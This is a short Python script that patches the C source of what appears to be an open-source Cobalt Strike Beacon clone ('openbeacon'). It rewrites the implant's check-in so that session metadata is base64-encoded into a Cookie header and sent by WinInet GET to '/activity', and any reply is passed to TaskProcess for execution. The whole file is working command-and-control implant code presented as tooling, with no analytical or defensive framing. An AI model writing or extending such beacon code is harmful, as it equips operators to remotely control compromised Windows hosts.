# -*- coding: utf-8 -*-
r"""fix_get_direct.py - replace transform-based GET with direct wininet
call that hardcodes the Cookie header from gSession.data."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\bXZb-tmp"
     r"\openbeacon\Beacon\beacon.c")
s = io.open(P, encoding="utf-8").read()

BS = chr(92)
L = chr(10)
Q = chr(39)  # single quote
EQ = chr(61)  # equals sign
CRNL = BS + "r" + BS + "n"

old_start = '\t\tchar uris[256];'
old_end = '\t\tNetworkPost(S_URI_POST);'
i1 = s.index(old_start)
i2 = s.index(old_end) + len(old_end)

lines = []
a = lines.append
a('\t\t/* direct GET: hardcoded Cookie header (bypasses transform) */')
a('\t\t{ char tb[64]; sprintf(tb, "NETGET: direct start"); OBTRACE(tb); }')
a('\t\tchar b64[512]; memset(b64, 0, sizeof(b64));')
a('\t\tint b64len = 0;')
a('\t\t{ const char* b64c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";')
a('\t\t  unsigned char* raw = (unsigned char*)gSession.data;')
a('\t\t  int rawlen = gSession.length;')
a('\t\t  int i;')
a('\t\t  for (i = 0; i < rawlen; i += 3) {')
a('\t\t    unsigned int v = (raw[i] << 16) | ((i+1 < rawlen ? raw[i+1] : 0) << 8) | (i+2 < rawlen ? raw[i+2] : 0);')
a('\t\t    b64[b64len++] = b64c[(v >> 18) & 0x3F];')
a('\t\t    b64[b64len++] = b64c[(v >> 12) & 0x3F];')
a("\t\t    b64[b64len++] = (i+1 < rawlen) ? b64c[(v >> 6) & 0x3F] : '" + EQ + "';")
a("\t\t    b64[b64len++] = (i+2 < rawlen) ? b64c[v & 0x3F] : '" + EQ + "';")
a('\t\t  }')
a('\t\t  b64[b64len] = 0;')
a('\t\t}')
a('\t\tchar headers[1024]; memset(headers, 0, sizeof(headers));')
a('\t\tsprintf(headers, "Cookie: %s' + CRNL + '", b64);')
a('\t\t{ char tb[128]; sprintf(tb, "NETGET: hdrlen=%d b64[0..15]=%.15s", (int)strlen(headers), b64); OBTRACE(tb); }')
a('\t\tHINTERNET hReq = HttpOpenRequestA(gInternetConnect, "GET", "/activity", NULL, NULL, NULL, gNetworkOptions, &gContext);')
a('\t\tif (hReq) {')
a('\t\t\tBOOL sent = HttpSendRequestA(hReq, headers, (DWORD)strlen(headers), NULL, 0);')
a('\t\t\t{ char tb[128]; sprintf(tb, "NETGET: direct sent=%d gle=%lu", sent, (unsigned long)GetLastError()); OBTRACE(tb); }')
a('\t\t\tif (sent) {')
a('\t\t\t\tchar* tdata = (char*)malloc(OB_MAX_GET);')
a('\t\t\t\tDWORD bytesAvail = 0;')
a('\t\t\t\tif (InternetQueryDataAvailable(hReq, &bytesAvail, 0, 0) && bytesAvail > 0 && bytesAvail < OB_MAX_GET) {')
a('\t\t\t\t\tDWORD bytesRead = 0;')
a('\t\t\t\t\tif (InternetReadFile(hReq, tdata, bytesAvail, &bytesRead) && bytesRead > 0) {')
a('\t\t\t\t\t\tTaskProcess(tdata, bytesRead);')
a('\t\t\t\t\t\tOBTRACE("NETGET: tasks processed");')
a('\t\t\t\t\t}')
a('\t\t\t\t}')
a('\t\t\t\tif (tdata) free(tdata);')
a('\t\t\t}')
a('\t\t\tInternetCloseHandle(hReq);')
a('\t\t}')
a('\t\tNetworkPost(S_URI_POST);')

new_block = L.join(lines)
s = s[:i1] + new_block + s[i2:]
io.open(P, "w", encoding="utf-8", newline="").write(s)
print("direct GET installed; size:", len(s))
